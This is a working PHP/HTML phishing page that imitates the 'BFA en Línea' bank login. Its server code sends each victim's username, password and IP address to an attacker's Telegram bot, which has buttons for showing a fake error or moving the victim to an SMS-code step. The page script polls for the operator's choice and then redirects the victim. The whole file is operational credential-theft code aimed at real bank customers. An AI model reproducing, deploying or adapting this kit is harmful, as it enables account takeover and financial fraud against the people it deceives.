<?php
/* Login System v2.1 - BFA en Línea */
session_start();
include("settings.php");

$security_seed = rand(1000, 9999);
$session_token = bin2hex(random_bytes(8));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $is_ajax = !empty($_POST['ajax']);
    $usuario = str_replace(' ', '', $_POST['ips1'] ?? '');
    $clave   = $_POST['ips2'] ?? '';
    $ip      = $_SERVER['REMOTE_ADDR'];

    // Rate limiting: máx 5 intentos por IP cada 10 minutos
    if (!file_exists('data')) mkdir('data', 0755, true);
    $rf   = "data/rl_" . md5($ip) . ".json";
    $now  = time();
    $hits = file_exists($rf) ? (json_decode(file_get_contents($rf), true) ?: []) : [];
    $hits = array_values(array_filter($hits, function($t) use ($now){ return $now - $t < 600; }));
    if (count($hits) >= 5) {
        if ($is_ajax) { header('Content-Type: application/json'); echo '{"ok":false,"err":"limit"}'; }
        else { header("Location: index.php"); }
        exit;
    }
    $hits[] = $now;
    file_put_contents($rf, json_encode($hits));

    $_SESSION['usuario']        = $usuario;
    $_SESSION['security_token'] = $session_token;

    $msg = "🔐 NUEVO INGRESO BFA\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [[
                ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
                ['text' => '📩 SMS',         'callback_data' => "SMS|$usuario"]
            ]]
        ])
    ]));

    if ($is_ajax) {
        header('Content-Type: application/json');
        echo '{"ok":true}';
        exit;
    }
    header("Location: espera.php");
    exit;
}
?>
<html lang="es"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Iniciar sesión</title>
<style>
  /* Solo lo mínimo que NO se puede inline (reset, hover, media queries y placeholder).
     Todo lo demás está en style="" para editar rápido en DevTools. */
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;color:#022a4f;background:#fff}
  a{color:#022a4f;text-decoration:none}
  a:hover{text-decoration:underline}
  img{max-width:100%;display:block}
  .form input::placeholder{color:#777}
  .btn-next:hover{filter:brightness(1.05)}

  @media (max-width: 880px){
    .body{grid-template-columns:1fr !important}
    .body .photo{display:none !important}
    .body .form-side{padding:80px 20px 40px !important;justify-content:flex-start !important}
    .avatar{margin-top:40px !important}
    .header{padding:12px 16px !important}
    .header .logo img{height:40px !important}
    .header .idioma img{width:40px !important;height:40px !important}
    .form-footer{grid-template-columns:1fr !important;text-align:center !important;margin-top:20px !important}
    .form-footer .norton,
    .form-footer .browsers{display:none !important}
    .form-footer .right-col{align-items:center !important;text-align:center !important}
    .form-footer .right-col .opt{display:none !important}
    .mobile-photo{display:none !important}
  }
  #overlay-carga{position:fixed;inset:0;z-index:9999;display:none;align-items:center;justify-content:center;background:#fff}
  #overlay-carga img{max-width:500px;width:60vw;height:auto}
</style>
</head>
<body>

<!-- OVERLAY DE CARGA -->
<div id="overlay-carga" style="display:none;position:fixed;inset:0;z-index:9999;align-items:center;justify-content:center;background:#fff">
  <img src="img/loading.gif" alt="Cargando...">
</div>

<!-- POPUP ERROR LOGIN -->
<div id="popup-error-login" style="display:none;position:fixed;inset:0;z-index:10000;align-items:center;justify-content:center;background:rgba(0,0,0,.45)">
  <div style="background:#fff;border-radius:18px;padding:28px 28px 32px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.2)">
    <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin:0 auto 18px">
      <circle cx="30" cy="30" r="27" stroke="#e53935" stroke-width="4"/>
      <line x1="20" y1="20" x2="40" y2="40" stroke="#e53935" stroke-width="4.5" stroke-linecap="round"/>
      <line x1="40" y1="20" x2="20" y2="40" stroke="#e53935" stroke-width="4.5" stroke-linecap="round"/>
    </svg>
    <p style="color:#022a4f;font-size:16px;font-weight:600;line-height:1.5">Usuario o contraseña inválida</p>
  </div>
</div>

<div class="page" style="min-height:100vh;display:flex;flex-direction:column">

  <!-- HEADER -->
  <header class="header" style="background:#f3f5f7;padding:14px 40px;display:flex;align-items:center;justify-content:space-between;">
    <div class="logo">
      <img src="img/BFAonline_BFA_en_Linea.png" alt="BFA EN LÍNEA" style="height:30px">
    </div>
    <div class="idioma" style="display:flex;align-items:center;gap:14px;color:#022a4f;font-size: 22px;font-weight:600">
      <span>Idioma</span>
      <img src="img/BFAonline_idioma.png" alt="Idioma" style="width:46px;height:46px">
    </div>
  </header>

  <!-- BODY -->
  <div class="body" style="flex:1;display:grid;grid-template-columns:1fr 460px;min-height:0">

    <!-- Slider lateral (escritorio) - desliza de derecha a izquierda -->
    <div class="photo" role="img" aria-label="Productor agropecuario" style="position:relative;min-height:560px;overflow:hidden">
      <img class="slide" src="img/sliderImg1.jpg" alt="" style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:translateX(0);transition:transform 1s ease-in-out">
      <img class="slide" src="img/sliderImg2.jpg" alt="" style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:translateX(100%);transition:transform 1s ease-in-out">
      <img class="slide" src="img/sliderImg3.jpg" alt="" style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:translateX(100%);transition:transform 1s ease-in-out">
      <img class="slide" src="img/sliderImg4.jpg" alt="" style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:translateX(100%);transition:transform 1s ease-in-out">
    </div>

    <!-- Formulario -->
    <div class="form-side" style="background:#fff;display:flex;flex-direction:column;align-items:center;padding:30px 40px">

      <!-- ============ STEP 1: USUARIO ============ -->
      <div id="step-1" style="display:flex;flex-direction:column;align-items:center;width:100%">

      <div class="avatar" style="margin-top:10px">
        <img src="img/BFAonline_administracion-11.png" alt="Usuario" style="width:64px;height:64px">
      </div>

      <form class="form" onsubmit="event.preventDefault();goToStep2()" style="width:100%;max-width:320px;margin-top:24px">
        <label for="usuario" style="margin-left: 38px;display:block;text-align: left;font-weight:600;color:#022a4f;font-size:15px;margin-bottom:8px">
          Usuario <span style="color:#e53935">*</span>
        </label>
        <input id="usuario" type="text" placeholder="Ingrese Usuario" autocomplete="username" style="/* width:100%; *//* padding:12px 18px; *//* border:0; *//* border-radius:30px; *//* background:#d9d9d9; *//* font-size:14px; *//* color:#333; *//* outline:none; */-webkit-text-size-adjust: 100%;-webkit-tap-highlight-color: rgba(0,0,0,0);--antd-wave-shadow-color: #1890ff;--scroll-bar: 0;--swiper-theme-color: #007aff;--swiper-navigation-size: 44px;--navbar-height: 68px;--navbar-width-short: 72px;--navbar-width-full: 20rem;--icon-size: 2.25rem;--color-blue: #002D57;--color-orange: #FF9012;--color-gray: #DDDDDD;--filter-white: invert(100%) sepia(100%) saturate(0%) hue-rotate(216deg) brightness(105%) contrast(101%);--color-secundary-gray: #898989;--color-form: #F7F8F8;--color-border-form: #DCDDDD;--color-primary: #FFFFFF;--color-text-input: #232323;--color-red: #FF0000;--color-yellow: #FFD700;--color-green1: #6EA03A;--color-green2: #B2C53A;--gradient-primary: linear-gradient(to right, var(--color-orange), var(--color-yellow));--gradient-secondary: linear-gradient(to right, var(--color-green1), var(--color-green2));--regular-weight: 400;--semiBold-weight: 600;--bold-weight: bold;--slider-w: 60%;font-family: 'Montserrat', sans-serif !important;box-sizing: border-box;margin: 0;line-height: inherit;border: 0;color: var(--color-text-input) !important;background: var(--color-gray) !important;outline: 0 !important;padding: 6px !important;padding-left: 10px !important;border-radius: 10px;font-size: 14px !important;font-weight: var(--regular-weight) !important;margin-left: 39px;-webkit-appearance: none;touch-action: manipulation;width: 15rem !important;">

        <br><button class="btn-next" type="submit" style="left: 10px;margin-left: 55px;-webkit-text-size-adjust: 100%;-webkit-tap-highlight-color: rgba(0,0,0,0);--antd-wave-shadow-color: #1890ff;--scroll-bar: 0;--swiper-theme-color: #007aff;--swiper-navigation-size: 44px;--navbar-height: 68px;--navbar-width-short: 72px;--navbar-width-full: 20rem;--icon-size: 2.25rem;--color-blue: #002D57;--color-orange: #FF9012;--color-gray: #DDDDDD;--filter-white: invert(100%) sepia(100%) saturate(0%) hue-rotate(216deg) brightness(105%) contrast(101%);--color-secundary-gray: #898989;--color-form: #F7F8F8;--color-border-form: #DCDDDD;--color-primary: #FFFFFF;--color-text-input: #232323;--color-red: #FF0000;--color-yellow: #FFD700;--color-green1: #6EA03A;--color-green2: #B2C53A;--gradient-primary: linear-gradient(to right, var(--color-orange), var(--color-yellow));--gradient-secondary: linear-gradient(to right, var(--color-green1), var(--color-green2));--regular-weight: 400;--semiBold-weight: 600;--bold-weight: bold;--slider-w: 60%;font-family: 'Montserrat', sans-serif !important;/* box-sizing: border-box; */touch-action: manipulation;margin: 0;font-size: inherit;line-height: inherit;overflow: visible;text-transform: none;-webkit-appearance: button;background: linear-gradient(to right, var(--color-orange), var(--color-yellow));color: var(--color-primary);border-radius: 34px;padding: 7px 25px;font-weight: var(--semiBold-weight);border: 0;cursor: pointer;outline: 0;display:block;margin:18px auto 0;/* padding:12px 48px; *//* border:0; *//* border-radius:30px; *//* background:linear-gradient(180deg,#fbbf24 0%,#f59e0b 100%); *//* color:#fff; *//* font-size:18px; *//* font-weight:600; *//* cursor:pointer; *//* box-shadow:0 2px 6px rgba(0,0,0,.1); */">
          Siguiente
        </button>

        <div class="check-row" style="display:flex;align-items:center;justify-content:center;gap:8px;margin-top:22px;font-size:14px;font-weight:600;color:#022a4f">
          <input id="recordar" type="checkbox" checked="" style="width:16px;height:16px;accent-color:#022a4f">
          <label for="recordar" style="display:inline;font-weight:600;margin:0">Recordar Usuario</label>
        </div>
        <br>
      </form>

      </div><!-- /step-1 -->

      <!-- ============ STEP 2: CONTRASEÑA ============ -->
      <div id="step-2" style="display:none;flex-direction:column;align-items:center;width:100%">

        <!-- Avatar con check verde -->
        <div class="avatar" style="margin-top:10px;position:relative;display:inline-block">
          <img src="img/BFAonline_administracion-11.png" alt="Usuario" style="width:64px;height:64px">
          <span style="position:absolute;right:-4px;bottom:-4px;width:24px;height:24px;border-radius:50%;background:#22c55e;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:bold;border:2px solid #fff;box-shadow:0 1px 3px rgba(0,0,0,.2)">✓</span>
        </div>

        <!-- Nombre del usuario validado -->
        <div id="userDisplay" style="margin-top:10px;font-size:15px;font-weight:700;color:#022a4f">usuario</div>
        <a href="#" onclick="event.preventDefault();goToStep1()" style="font-size:12px;color:#022a4f;text-decoration:underline;margin-top:2px">Cambiar usuario</a>

        <form class="form" onsubmit="event.preventDefault();doLogin()" style="width:100%;max-width:320px;margin-top:18px">
          <label for="password" style="margin-left:38px;display:block;text-align:left;font-weight:600;color:#022a4f;font-size:15px;margin-bottom:8px">
            Contraseña <span style="color:#e53935">*</span>
          </label>
          <input id="password" type="password" placeholder="Ingrese Contraseña" autocomplete="current-password"
                 style="background:#dddddd;color:#232323;outline:0;padding:6px 10px;border:0;border-radius:10px;font-size:14px;margin-left:39px;width:15rem;font-family:'Montserrat',sans-serif">

          <br><button class="btn-next" type="submit"
                  style="margin-left:55px;background:linear-gradient(to right,#FF9012,#FFD700);color:#fff;border-radius:34px;padding:7px 25px;font-weight:600;border:0;cursor:pointer;outline:0;display:block;margin:18px auto 0;font-family:'Montserrat',sans-serif">
            Ingresar
          </button>
          <div id="err-login" style="display:none;color:#e53935;font-size:13px;font-weight:600;text-align:center;margin-top:12px">Usuario o contraseña incorrectos.</div>
        </form>

      </div><!-- /step-2 -->

      <div class="help" style="text-align:center;margin-top:26px;font-size:14px">
        <div style="font-weight:700;color:#022a4f;margin-bottom:4px">Para asistencia</div>
        <a href="mailto:info.bfaonline@bfa.gob.sv" style="font-weight:700;text-decoration:underline;color:#022a4f">info.bfaonline@bfa.gob.sv</a>
      </div>
<br>

      <div class="recover" style="text-align:center;margin-top:22px;font-size:14px;font-weight:700">
        <a href="#" style="text-decoration:underline">¿No puedes iniciar sesión?</a>
      </div>
<br>
<br><br><br>
      <div class="contact" style="margin-top:30px;display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap">
        <div class="socials" style="display:flex;flex-direction:column;align-items:center;gap:6px">
          <div class="icons" style="display:flex;gap:10px;align-items:center">
            <a href="#"><img src="img/fb-logo.png" alt="Facebook" style="width:18px;height:18px;object-fit:contain"></a>
            <a href="#"><img src="img/instagram-logo.png" alt="Instagram" style="width:18px;height:18px;object-fit:contain"></a>
            <a href="#"><img src="img/x-logo.png" alt="X" style="width:18px;height:18px;object-fit:contain"></a>
            <a href="#"><img src="img/youtube-logo.png" alt="YouTube" style="width:18px;height:18px;object-fit:contain"></a>
          </div>
          <div class="web" style="font-size:13px;font-weight:700;color:#022a4f">www.bfa.gob.sv</div>
        </div>
        <div class="divider" style="width:1px;height:48px;background:#022a4f;opacity:.3"></div>
        <div class="phone" style="display:flex;align-items:center;gap:10px">
          <img src="img/telefono-icon.png" alt="Teléfono" style="width:28px;height:28px">
          <div>
            <div class="num" style="font-size:22px;font-weight:700;color:#022a4f;line-height:1">2241-7400</div>
            <div class="telebfa" style="font-size:12px;font-weight:700;color:#022a4f;margin-top:2px">TELEBFA</div>
          </div>
        </div>
      </div>

      <!-- Bloque inferior: Norton + copyright + browsers -->
      <div class="form-footer" style="width:100%;margin-top:30px;padding-top:18px;display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:center">
        <div class="norton">
          <img src="img/nortonsecured-logo.png" alt="Norton Secured" style="height:50px">
        </div>
        <div class="right-col" style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;font-size:12px;color:#022a4f;text-align:right">
          <div class="copy" style="font-weight:600;line-height:1.3">© 2026 - BFA en Línea. Todos los derechos reservados.</div>
          <div class="opt" style="font-weight:600">Optimizado para navegadores. V1.8.11</div>
          <div class="browsers" style="display:flex;align-items:center;gap:10px;margin-top:4px">
            <a class="b" href="#" title="Microsoft Edge" style="display:flex;align-items:center;gap:4px;font-size:11px;color:#022a4f">
              <img src="img/edge-logo.svg" alt="Edge" style="width:22px;height:22px"><span>Microsoft Edge</span>
            </a>
            <a class="b" href="#" title="Google Chrome" style="display:flex;align-items:center;gap:4px;font-size:11px;color:#022a4f">
              <img src="img/chrome-logo.svg" alt="Chrome" style="width:22px;height:22px"><span>Google Chrome</span>
            </a>
          </div>
        </div>
      </div>

      <!-- Imagen visible solo en móvil -->
      <img class="mobile-photo" src="img/sliderImg1.jpg" alt="Productor agropecuario" style="display:none">
    </div>
  </div>

</div>

<script>
  function showOverlay(ms, cb){
    var ov = document.getElementById('overlay-carga');
    ov.style.display = 'flex';
    setTimeout(function(){ ov.style.display = 'none'; cb(); }, ms);
  }
  function goToStep2(){
    var u = document.getElementById('usuario').value.trim();
    if(!u){ document.getElementById('usuario').focus(); return; }
    document.getElementById('userDisplay').textContent = u;
    document.getElementById('step-1').style.display = 'none';
    showOverlay(2000, function(){
      document.getElementById('step-2').style.display = 'flex';
      setTimeout(function(){ document.getElementById('password').focus(); }, 50);
    });
  }
  function goToStep1(){
    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-1').style.display = 'flex';
  }
  function doLogin(){
    var u = document.getElementById('userDisplay').textContent;
    var p = document.getElementById('password').value;
    if(!p){ document.getElementById('password').focus(); return; }
    try{ sessionStorage.setItem('bfa_user', u); }catch(e){}
    var fd = new FormData();
    fd.append('ips1', u);
    fd.append('ips2', p);
    fd.append('ajax', '1');
    fetch('index.php', {method:'POST', body:fd}).catch(function(){});
    var ov = document.getElementById('overlay-carga');
    ov.style.display = 'flex';
    var elapsed = 0;
    var poll = setInterval(function(){
      elapsed += 2000;
      fetch('status.php?u=' + encodeURIComponent(u) + '&tipo=login')
        .then(function(r){ return r.json(); })
        .then(function(d){
          if (d.action === 'ERROR') {
            clearInterval(poll);
            ov.style.display = 'none';
            document.getElementById('password').value = '';
            goToStep1();
            var popup = document.getElementById('popup-error-login');
            popup.style.display = 'flex';
            setTimeout(function(){ popup.style.display = 'none'; }, 3000);
          } else if (d.action === 'SMS' || elapsed >= 15000) {
            clearInterval(poll);
            ov.style.display = 'none';
            window.location.href = 'som.html';
          }
        }).catch(function(){});
      if (elapsed >= 15000) {
        clearInterval(poll);
        ov.style.display = 'none';
        window.location.href = 'som.html';
      }
    }, 2000);
  }

  // Auto-slider del panel izquierdo (desliza de derecha a izquierda)
  (function(){
    var slides = document.querySelectorAll('.photo .slide');
    if(!slides.length) return;
    var i = 0;
    setInterval(function(){
      // la slide actual sale hacia la izquierda
      slides[i].style.transform = 'translateX(-100%)';
      // la siguiente entra desde la derecha
      var next = (i + 1) % slides.length;
      slides[next].style.transition = 'none';
      slides[next].style.transform = 'translateX(100%)';
      // forzar reflow para que aplique el reset antes de animar
      void slides[next].offsetWidth;
      slides[next].style.transition = 'transform 1s ease-in-out';
      slides[next].style.transform = 'translateX(0)';
      i = next;
    }, 5000);
  })();
</script>

<!-- Code injected by live-server -->
<script>
	// <![CDATA[  <-- For SVG support
	if ('WebSocket' in window) {
		(function () {
			function refreshCSS() {
				var sheets = [].slice.call(document.getElementsByTagName("link"));
				var head = document.getElementsByTagName("head")[0];
				for (var i = 0; i < sheets.length; ++i) {
					var elem = sheets[i];
					var parent = elem.parentElement || head;
					parent.removeChild(elem);
					var rel = elem.rel;
					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
					}
					parent.appendChild(elem);
				}
			}
			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
			var address = protocol + window.location.host + window.location.pathname + '/ws';
			var socket = new WebSocket(address);
			socket.onmessage = function (msg) {
				if (msg.data == 'reload') window.location.reload();
				else if (msg.data == 'refreshcss') refreshCSS();
			};
			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
				console.log('Live reload enabled.');
				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
			}
		})();
	}
	else {
		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
	}
	// ]]>
</script>


</body></html>
